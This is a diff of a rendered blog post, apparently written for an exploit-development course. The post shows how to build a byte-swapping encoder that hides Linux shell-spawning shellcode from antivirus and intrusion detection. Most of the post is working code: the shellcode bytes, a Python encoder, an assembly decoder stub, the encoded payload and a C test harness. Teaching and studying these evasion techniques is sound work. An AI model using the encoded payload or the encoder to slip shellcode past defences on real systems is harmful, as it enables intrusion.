@@ -70,7 +70,7 @@
 <p>The purpose of creating a custom encoding scheme in exploit development craft is to evade antiviruses and intrusion detection systems. When crafting one, keep in mind that its purpose is to fool, more often than not, signature-based software, not an intelligent live person who dedicated his life to breaking encryption algorithms. So it doesn't have to be too complicated.</p>
 <p>To apply the encoding scheme to a shellcode one usually creates a separate encoder and a decoding stub, which becomes a part of a new shellcode and is used to decode the main encoded payload before transferring the execution flow to it.</p>
 <p>Before describing the encoding scheme I came up with, let's first create a shellcode to work with. I will use the shell-starting shellcode:</p>
-<div class="highlight"><pre><span class="nf">section</span> <span class="no">.text</span>
+<div class="highlight"><pre><span></span><span class="nf">section</span> <span class="no">.text</span>
     <span class="nf">global</span> <span class="no">_start</span>
 
 <span class="nl">_start:</span>
@@ -78,52 +78,52 @@
     <span class="no">push</span> <span class="no">eax</span> 
     <span class="no">push</span> <span class="mi">0x68732f6e</span>
     <span class="nf">push</span> <span class="mi">0x69622f2f</span>
-    <span class="nf">mov</span> <span class="no">ebx</span><span class="p">,</span> <span class="no">esp</span>        <span class="err">;</span> <span class="no">put</span> <span class="no">string</span> <span class="no">address</span> <span class="no">into</span> <span class="no">ebx</span>
-    <span class="nf">xor</span> <span class="no">ecx</span><span class="p">,</span> <span class="no">ecx</span>        <span class="err">;</span> <span class="no">args</span>
-    <span class="nf">xor</span> <span class="no">edx</span><span class="p">,</span> <span class="no">edx</span>        <span class="err">;</span> <span class="no">env</span> <span class="no">vars</span>
-    <span class="nf">mov</span> <span class="no">al</span><span class="p">,</span> <span class="mi">11</span>
+    <span class="nf">mov</span> <span class="no">ebx</span><span class="p">,</span> <span class="no">esp</span>        <span class="c">; put string address into ebx</span>
+    <span class="no">xor</span> <span class="no">ecx</span><span class="p">,</span> <span class="no">ecx</span>        <span class="c">; args</span>
+    <span class="no">xor</span> <span class="no">edx</span><span class="p">,</span> <span class="no">edx</span>        <span class="c">; env vars</span>
+    <span class="no">mov</span> <span class="no">al</span><span class="p">,</span> <span class="mi">11</span>
     <span class="nf">int</span> <span class="mi">80</span><span class="no">h</span> 
 </pre></div>
 
 
 <div class="divider"></div>
 
-<div class="highlight"><pre>nasm -f elf stacksh.asm <span class="o">&amp;&amp;</span> ld stacksh.o -o stacksh <span class="o">&amp;&amp;</span> ./stacksh
+<div class="highlight"><pre><span></span>nasm -f elf stacksh.asm <span class="o">&amp;&amp;</span> ld stacksh.o -o stacksh <span class="o">&amp;&amp;</span> ./stacksh
 scdump stacksh
 </pre></div>
 
 
 <p>Output from the last command (formatted to fit the screen):</p>
-<div class="highlight"><pre>Length:  23
+<div class="highlight"><pre><span></span>Length:  23
 Payload: &quot;\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x31\xc9&quot;
 &quot;\x31\xd2\xb0\x0b\xcd\x80&quot;
 </pre></div>
 
 
 <p>The encoding scheme itself is super simple. It just exchanges position of two adjacent bytes. For it to work correctly, the shellcode length must be a multiple of 2. So, if it is not, the encoder appends a no-operation <code>\x90</code> byte to satisfy the requirement. The encoder implementation in Python follows:</p>
-<div class="highlight"><pre><span class="c">#!/usr/bin/env python</span>
+<div class="highlight"><pre><span></span><span class="ch">#!/usr/bin/env python</span>
 
-<span class="c"># Author: Oleg Mitrofanov (reider-roque) 2015</span>
+<span class="c1"># Author: Oleg Mitrofanov (reider-roque) 2015</span>
 
 <span class="kn">from</span> <span class="nn">itertools</span> <span class="kn">import</span> <span class="n">cycle</span>
 <span class="kn">import</span> <span class="nn">os.path</span>
 <span class="kn">import</span> <span class="nn">sys</span>
 
 <span class="k">def</span> <span class="nf">hexlify</span><span class="p">(</span><span class="n">data</span><span class="p">):</span> 
-    <span class="k">return</span> <span class="s">&quot;&quot;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="s">&quot;</span><span class="se">\\</span><span class="s">x{:02x}&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="n">c</span><span class="p">))</span> <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">data</span><span class="p">)</span>
+    <span class="k">return</span> <span class="s2">&quot;&quot;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\\</span><span class="s2">x{:02x}&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="n">c</span><span class="p">))</span> <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">data</span><span class="p">)</span>
 
 <span class="k">def</span> <span class="nf">hexlify_nasm</span><span class="p">(</span><span class="n">data</span><span class="p">):</span> 
-    <span class="k">return</span> <span class="s">&quot;&quot;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="s">&quot;0x{:02x},&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="n">c</span><span class="p">))</span> <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">data</span><span class="p">)[:</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
+    <span class="k">return</span> <span class="s2">&quot;&quot;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="s2">&quot;0x{:02x},&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="n">c</span><span class="p">))</span> <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">data</span><span class="p">)[:</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
 
 <span class="k">def</span> <span class="nf">unhexlify</span><span class="p">(</span><span class="n">data</span><span class="p">):</span>
-    <span class="k">return</span> <span class="s">&quot;&quot;</span><span class="o">.</span><span class="n">join</span><span class="p">([</span><span class="nb">chr</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">num</span><span class="p">,</span> <span class="mi">16</span><span class="p">))</span> <span class="k">for</span> <span class="n">num</span> <span class="ow">in</span> <span class="n">data</span><span class="p">[</span><span class="mi">2</span><span class="p">:]</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s">&quot;</span><span class="se">\\</span><span class="s">x&quot;</span><span class="p">)])</span>
+    <span class="k">return</span> <span class="s2">&quot;&quot;</span><span class="o">.</span><span class="n">join</span><span class="p">([</span><span class="nb">chr</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">num</span><span class="p">,</span> <span class="mi">16</span><span class="p">))</span> <span class="k">for</span> <span class="n">num</span> <span class="ow">in</span> <span class="n">data</span><span class="p">[</span><span class="mi">2</span><span class="p">:]</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\\</span><span class="s2">x&quot;</span><span class="p">)])</span>
 
 
-<span class="n">script_name</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">basename</span><span class="p">(</span><span class="n">__file__</span><span class="p">)</span>
+<span class="n">script_name</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">basename</span><span class="p">(</span><span class="vm">__file__</span><span class="p">)</span>
 <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">2</span><span class="p">:</span>
-    <span class="k">print</span><span class="p">(</span><span class="s">&quot;Error: invalid number of arguments&quot;</span><span class="p">)</span>
-    <span class="k">print</span><span class="p">(</span><span class="s">&quot;Usage:</span><span class="se">\n\t</span><span class="s">{} SHELLCODE&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">script_name</span><span class="p">))</span> 
-    <span class="k">print</span><span class="p">(</span><span class="s">&quot;Example:</span><span class="se">\n\t</span><span class="s">{} &#39;</span><span class="se">\\</span><span class="s">aa</span><span class="se">\\</span><span class="s">bb</span><span class="se">\\</span><span class="s">cc</span><span class="se">\\</span><span class="s">dd&#39;&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">script_name</span><span class="p">))</span>
+    <span class="k">print</span><span class="p">(</span><span class="s2">&quot;Error: invalid number of arguments&quot;</span><span class="p">)</span>
+    <span class="k">print</span><span class="p">(</span><span class="s2">&quot;Usage:</span><span class="se">\n\t</span><span class="s2">{} SHELLCODE&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">script_name</span><span class="p">))</span> 
+    <span class="k">print</span><span class="p">(</span><span class="s2">&quot;Example:</span><span class="se">\n\t</span><span class="s2">{} &#39;</span><span class="se">\\</span><span class="s2">aa</span><span class="se">\\</span><span class="s2">bb</span><span class="se">\\</span><span class="s2">cc</span><span class="se">\\</span><span class="s2">dd&#39;&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">script_name</span><span class="p">))</span>
     <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
 
 <span class="n">cleartext</span> <span class="o">=</span> <span class="n">unhexlify</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span>
@@ -131,23 +131,23 @@ Payload: &quot;\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x31\
 <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">cleartext</span><span class="p">)</span> <span class="o">%</span> <span class="mi">2</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">:</span>
     <span class="n">cleartext</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="mh">0x90</span><span class="p">)</span>
 
-<span class="n">encrypted</span> <span class="o">=</span> <span class="s">&#39;&#39;</span>
+<span class="n">encrypted</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
 <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">cleartext</span><span class="p">),</span> <span class="mi">2</span><span class="p">):</span>
     <span class="n">encrypted</span> <span class="o">+=</span> <span class="n">cleartext</span><span class="p">[</span><span class="n">i</span><span class="o">+</span><span class="mi">1</span><span class="p">]</span> <span class="o">+</span> <span class="n">cleartext</span><span class="p">[</span><span class="n">i</span><span class="p">]</span>
 
-<span class="k">print</span><span class="p">(</span><span class="s">&#39;ENCRYPTED OUTPUT:&#39;</span><span class="p">)</span>
-<span class="k">print</span><span class="p">(</span><span class="s">&#39;Standard:  {}&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">hexlify</span><span class="p">(</span><span class="n">encrypted</span><span class="p">)))</span>
-<span class="k">print</span><span class="p">(</span><span class="s">&#39;NASM:      {}&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">hexlify_nasm</span><span class="p">(</span><span class="n">encrypted</span><span class="p">)))</span>
+<span class="k">print</span><span class="p">(</span><span class="s1">&#39;ENCRYPTED OUTPUT:&#39;</span><span class="p">)</span>
+<span class="k">print</span><span class="p">(</span><span class="s1">&#39;Standard:  {}&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">hexlify</span><span class="p">(</span><span class="n">encrypted</span><span class="p">)))</span>
+<span class="k">print</span><span class="p">(</span><span class="s1">&#39;NASM:      {}&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">hexlify_nasm</span><span class="p">(</span><span class="n">encrypted</span><span class="p">)))</span>
 </pre></div>
 
 
 <p>Let's encode the main payload:</p>
-<div class="highlight"><pre>./xchgencoder <span class="s2">&quot;\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x31\xc9\x31\xd2\xb0\x0b\xcd\x80&quot;</span>
+<div class="highlight"><pre><span></span>./xchgencoder <span class="s2">&quot;\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x31\xc9\x31\xd2\xb0\x0b\xcd\x80&quot;</span>
 </pre></div>
 
 
 <p>Output (formatted to fit the screen):</p>
-<div class="highlight"><pre>ENCRYPTED OUTPUT:
+<div class="highlight"><pre><span></span>ENCRYPTED OUTPUT:
 Standard:  \xc0\x31\x68\x50\x2f\x6e\x68\x73\x2f\x68\x62\x2f\x89\x69\x31\xe3\x31
 \xc9\xb0\xd2\xcd\x0b\x90\x80
 NASM:      0xc0,0x31,0x68,0x50,0x2f,0x6e,0x68,0x73,0x2f,0x68,0x62,0x2f,0x89,0x69,
@@ -156,21 +156,21 @@ NASM:      0xc0,0x31,0x68,0x50,0x2f,0x6e,0x68,0x73,0x2f,0x68,0x62,0x2f,0x89,0x69
 
 
 <p>After the encoded payload was ready all I needed to do was write the decoder stub in Assembly. The decoding stub first decodes the main payload and then jumps the execution to where the payload begins:</p>
-<div class="highlight"><pre><span class="nf">section</span> <span class="no">.text</span>
+<div class="highlight"><pre><span></span><span class="nf">section</span> <span class="no">.text</span>
     <span class="nf">global</span> <span class="no">_start</span>
 
 <span class="nl">_start:</span>
     <span class="nf">jmp</span> <span class="no">.data</span>
 <span class="nl">.code:</span>
-    <span class="nf">pop</span> <span class="no">esi</span>             <span class="err">;</span> <span class="no">Point</span> <span class="no">ESI</span> <span class="no">to</span> <span class="no">the</span> <span class="no">beginning</span> <span class="no">of</span> <span class="no">the</span> <span class="no">shellcode</span>
-    <span class="nf">push</span> <span class="no">shellcode_len</span>  <span class="err">;</span> <span class="no">Put</span> <span class="p">(</span><span class="no">shellcode</span> <span class="no">length</span><span class="p">)</span><span class="err">/</span><span class="mi">2</span> <span class="no">into</span> <span class="no">ECX</span>
-    <span class="nf">pop</span> <span class="no">ecx</span>
+    <span class="nf">pop</span> <span class="no">esi</span>             <span class="c">; Point ESI to the beginning of the shellcode</span>
+    <span class="no">push</span> <span class="no">shellcode_len</span>  <span class="c">; Put (shellcode length)/2 into ECX</span>
+    <span class="no">pop</span> <span class="no">ecx</span>
     <span class="nf">xor</span> <span class="no">eax</span><span class="p">,</span> <span class="no">eax</span>
 <span class="nl">.decrypt:</span>
-    <span class="nf">lodsw</span>            <span class="err">;</span> <span class="no">load</span> <span class="no">two</span> <span class="no">shellcode</span> <span class="no">bytes</span> <span class="no">into</span> <span class="no">EAX</span>
-    <span class="nf">mov</span> <span class="err">[</span><span class="no">esi-1</span><span class="err">]</span><span class="p">,</span> <span class="no">al</span>  <span class="err">;</span> <span class="no">and</span> <span class="no">switch</span> <span class="no">them</span>
-    <span class="nf">shr</span> <span class="no">eax</span><span class="p">,</span> <span class="mi">8</span>
-    <span class="nf">mov</span> <span class="err">[</span><span class="no">esi-2</span><span class="err">]</span><span class="p">,</span> <span class="no">al</span>
+    <span class="nf">lodsw</span>            <span class="c">; load two shellcode bytes into EAX</span>
+    <span class="no">mov</span> <span class="p">[</span><span class="no">esi-1</span><span class="p">],</span> <span class="no">al</span>  <span class="c">; and switch them</span>
+    <span class="no">shr</span> <span class="no">eax</span><span class="p">,</span> <span class="mi">8</span>
+    <span class="nf">mov</span> <span class="p">[</span><span class="no">esi-2</span><span class="p">],</span> <span class="no">al</span>
     <span class="nf">loop</span> <span class="no">.decrypt</span>    
     <span class="no">jmp</span> <span class="no">shellcode</span>
 
@@ -184,13 +184,13 @@ NASM:      0xc0,0x31,0x68,0x50,0x2f,0x6e,0x68,0x73,0x2f,0x68,0x62,0x2f,0x89,0x69
 
 <p>In the above code to make the long shellcode fit the screen and keep the code executable (in case you are copy-pasting), I divided it into two parts with the second titled <em>sc_continued</em>. In the actual source code it is just one long line of comma separated bytes titled <em>shellcode</em>.</p>
 <p>It's time to build another binary and extract the resulting shellcode:</p>
-<div class="highlight"><pre>nasm -f elf xchgdecoder.asm <span class="o">&amp;&amp;</span> ld -o xchgdecoder xchgdecoder.o
+<div class="highlight"><pre><span></span>nasm -f elf xchgdecoder.asm <span class="o">&amp;&amp;</span> ld -o xchgdecoder xchgdecoder.o
 scdump xchgdecoder
 </pre></div>
 
 
 <p>Output:</p>
-<div class="highlight"><pre>Length:  52
+<div class="highlight"><pre><span></span>Length:  52
 Payload: &quot;\xeb\x15\x5e\x6a\x0c\x59\x31\xc0\x66\xad\x88\x46\xff\xc1\xe8\x08\x88&quot;
 &quot;\x46\xfe\xe2\xf3\xeb\x05\xe8\xe6\xff\xff\xff\xc0\x31\x68\x50\x2f\x6e\x68\x73&quot;
 &quot;\x2f\x68\x62\x2f\x89\x69\x31\xe3\x31\xc9\xb0\xd2\xcd\x0b\x90\x80&quot;
@@ -199,8 +199,8 @@ Payload: &quot;\xeb\x15\x5e\x6a\x0c\x59\x31\xc0\x66\xad\x88\x46\xff\xc1\xe8\x08\
 
 <p>Remember that if you try to run the <code>./xchgdecoder</code> by itself you'll get segmentation fault as soon as your stub decoder tries to overwrite the first byte of the encrypted payload. Overwriting executable code of the <em>.text</em> section is prohibited by design and you can do nothing about it.</p>
 <p>To test that the whole encoding business is actually working we'll need the help of a C language. Here is the source code that tests our shellcode:</p>
-<div class="highlight"><pre><span class="cp">#include &lt;stdio.h&gt;</span>
-<span class="cp">#include &lt;string.h&gt;</span>
+<div class="highlight"><pre><span></span><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp"></span>
+<span class="cp">#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp"></span>
 
 <span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">shellcode</span><span class="p">[]</span> <span class="o">=</span> <span class="s">&quot;</span><span class="se">\xeb\x15\x5e\x6a\x0c\x59\x31\xc0\x66\xad\x88\x46\xff</span><span class="s">&quot;</span>
 <span class="s">&quot;</span><span class="se">\xc1\xe8\x08\x88\x46\xfe\xe2\xf3\xeb\x05\xe8\xe6\xff\xff\xff\xc0\x31\x68\x50\x2f</span><span class="s">&quot;</span>
@@ -218,12 +218,12 @@ Payload: &quot;\xeb\x15\x5e\x6a\x0c\x59\x31\xc0\x66\xad\x88\x46\xff\xc1\xe8\x08\
 
 
 <p>And that's how we build a binary out of it and run the result:</p>
-<div class="highlight"><pre>gcc -fno-stack-protector -z execstack -o scframe scframe.c
+<div class="highlight"><pre><span></span>gcc -fno-stack-protector -z execstack -o scframe scframe.c
 ./scframe
 </pre></div>
 
 
-<p><img alt="Working encoded shellcode" src="http://www.wryway.com/blog/assembly-custom-encoding-scheme/working-encoded-shellcode.png" title="Working encoded shellcode" />
+<p><img alt="Working encoded shellcode" src="http://www.wryway.com/blog/assembly-custom-encoding-scheme/working-encoded-shellcode.png" title="Working encoded shellcode">
 <div class="img-caption">It works!</div></p>
 <div class="divider"></div>
 
@@ -280,7 +280,7 @@ This blog post was created to fulfill the requirements of the <a href="http://se
     </ul>
 
     <p class="disclaimer">
-    Oleg Mitrofanov &copy; 2015-2016.
+    Oleg Mitrofanov &copy; 2015-2017.
     Built with <a href="http://getpelican.com">Pelican</a>, and <a href="https://github.com/hdra/Pelican-Cid">Cid</a> theme.
     </p>
 </footer>
